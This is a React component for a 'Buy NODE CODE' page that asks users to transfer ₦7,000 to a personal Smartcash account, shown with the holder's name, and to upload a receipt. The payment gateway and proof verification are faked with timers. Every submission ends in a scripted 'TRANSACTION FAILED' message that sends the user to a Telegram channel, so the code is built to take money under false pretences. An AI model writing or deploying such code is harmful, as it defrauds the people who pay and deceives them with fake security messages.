
import React, { useState } from 'react';
import { ArrowLeft, CreditCard, Loader2, Upload, AlertTriangle, ExternalLink, ShieldCheck, Copy, Check } from 'lucide-react';

interface BuyBPCPageProps {
  onBack: () => void;
  user: { name: string; email?: string };
}

type Step = 'initial' | 'loading-pay' | 'details' | 'loading-submit' | 'failed';

const BuyBPCPage: React.FC<BuyBPCPageProps> = ({ onBack, user }) => {
  const [step, setStep] = useState<Step>('initial');
  const [file, setFile] = useState<File | null>(null);
  const [copied, setCopied] = useState(false);

  const accountNumber = "0318053211";

  const handlePayClick = () => {
    setStep('loading-pay');
    setTimeout(() => {
      setStep('details');
    }, 3000);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(accountNumber);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmitProof = () => {
    setStep('loading-submit');
    setTimeout(() => {
      setStep('failed');
    }, 4000);
  };

  const handleJoinTelegram = () => {
    window.open('https://t.me/novapay999', '_blank');
  };

  if (step === 'loading-pay' || step === 'loading-submit') {
    return (
      <div className="min-h-[400px] flex flex-col items-center justify-center text-center p-6 animate-fadeIn">
        <Loader2 size={48} className="text-blue-500 animate-spin mb-6" />
        <h3 className="text-xl font-black italic tracking-widest text-blue-500">
          {step === 'loading-pay' ? 'INITIALIZING PAYMENT GATEWAY' : 'VERIFYING PROOF OF PAYMENT'}
        </h3>
        <p className="text-[10px] text-gray-500 mt-2 uppercase tracking-[0.2em] animate-pulse">
          Establishing Secure Node Connection...
        </p>
      </div>
    );
  }

  if (step === 'failed') {
    return (
      <div className="animate-fadeIn flex flex-col items-center justify-center text-center py-12 px-4">
        <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mb-6">
          <AlertTriangle size={40} className="text-red-500" />
        </div>
        <h2 className="text-2xl font-black text-white mb-2 tracking-tight">TRANSACTION FAILED</h2>
        <p className="text-gray-400 text-sm mb-8 leading-relaxed max-w-xs mx-auto">
          Security protocol interference detected. Manual verification required via our official channel.
        </p>
        <button
          onClick={handleJoinTelegram}
          className="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-bold text-sm transition-all flex items-center justify-center gap-2 group shadow-xl shadow-blue-600/20"
        >
          JOIN TELEGRAM CHANNEL
          <ExternalLink size={18} className="group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform" />
        </button>
        <button onClick={onBack} className="mt-6 text-xs text-gray-500 uppercase font-black tracking-widest hover:text-white transition-colors">
          Return to Dashboard
        </button>
      </div>
    );
  }

  return (
    <div className="animate-fadeIn">
      <div className="flex items-center gap-4 mb-8">
        <button onClick={onBack} className="p-2 hover:bg-white/5 rounded-xl transition-colors">
          <ArrowLeft size={24} className="text-gray-400" />
        </button>
        <h2 className="text-xl font-black italic tracking-wider text-blue-500 uppercase">Buy NODE CODE</h2>
      </div>

      {step === 'initial' && (
        <div className="space-y-6">
          <div className="glass-card p-6 rounded-[2rem] border-blue-500/20 space-y-6">
            <div className="flex justify-between items-start">
              <div>
                <p className="text-[10px] text-gray-500 uppercase font-black tracking-widest mb-1">Subscriber</p>
                <h3 className="text-lg font-bold text-white">{user.name}</h3>
                <p className="text-xs text-blue-400 font-medium">{user.email}</p>
              </div>
              <div className="p-3 bg-blue-500/10 rounded-2xl">
                <ShieldCheck size={20} className="text-blue-400" />
              </div>
            </div>

            <div className="pt-4 border-t border-white/5">
              <div className="flex justify-between items-center mb-2">
                <span className="text-xs text-gray-400 font-medium uppercase tracking-widest">NODE Asset Cost</span>
                <span className="text-lg font-black text-white">₦7,000</span>
              </div>
              <p className="text-[10px] text-gray-500 leading-relaxed italic">
                You are about to initiate a request for NODE digital assets. Payment will be processed via direct node transfer.
              </p>
            </div>
          </div>

          <button
            onClick={handlePayClick}
            className="w-full blue-gradient py-4 rounded-2xl font-black text-sm shadow-xl shadow-blue-500/20 flex items-center justify-center gap-2 group hover:scale-[1.02] active:scale-95 transition-all"
          >
            PROCEED TO PAY ₦7,000
          </button>
        </div>
      )}

      {step === 'details' && (
        <div className="space-y-6">
          <div className="glass-card p-6 rounded-[2rem] border-blue-500/20 space-y-6">
            <div className="text-center">
              <p className="text-[10px] text-blue-400 uppercase font-black tracking-[0.25em] mb-4">Official Service Account</p>
              
              <div 
                onClick={handleCopy}
                className="flex items-center justify-center gap-3 mb-1 cursor-pointer group"
              >
                <h3 className="text-3xl font-black text-white tracking-widest">{accountNumber}</h3>
                <div className="p-2 rounded-lg bg-white/5 group-hover:bg-white/10 transition-colors">
                  {copied ? <Check size={16} className="text-green-500" /> : <Copy size={16} className="text-gray-500" />}
                </div>
              </div>
              
              <p className="text-sm font-bold text-gray-300 uppercase">Smartcash</p>
              <p className="text-xs text-gray-500 font-medium mt-1 uppercase tracking-tight">OHI AYO ABDULSALAM</p>
              
              {copied && (
                <p className="text-[9px] text-green-500 font-black uppercase mt-2 tracking-widest animate-pulse">Account Copied!</p>
              )}
            </div>

            <div className="pt-6 border-t border-white/5">
              <p className="text-[10px] text-gray-500 uppercase font-black tracking-widest mb-3 text-center">Upload Proof of Payment</p>
              <label className="w-full h-32 border-2 border-dashed border-white/10 rounded-2xl flex flex-col items-center justify-center gap-2 cursor-pointer hover:border-blue-500/30 hover:bg-white/5 transition-all">
                <input 
                  type="file" 
                  className="hidden" 
                  onChange={(e) => setFile(e.target.files?.[0] || null)}
                />
                <Upload size={24} className={file ? 'text-blue-500' : 'text-gray-500'} />
                <span className="text-[11px] font-bold text-gray-400 uppercase tracking-tighter">
                  {file ? file.name : 'Choose receipt image'}
                </span>
              </label>
            </div>
          </div>

          <button
            onClick={handleSubmitProof}
            disabled={!file}
            className={`w-full py-4 rounded-2xl font-black text-sm shadow-xl transition-all flex items-center justify-center gap-2 ${
              file ? 'blue-gradient shadow-blue-500/20 hover:scale-[1.02] active:scale-95' : 'bg-white/5 text-gray-600 cursor-not-allowed'
            }`}
          >
            SUBMIT VERIFICATION
          </button>
          
          <p className="text-[9px] text-center text-gray-500 uppercase tracking-widest leading-relaxed">
            Ensure the transaction reference is visible. Assets are usually deployed within 5-10 node cycles.
          </p>
        </div>
      )}
    </div>
  );
};

export default BuyBPCPage;
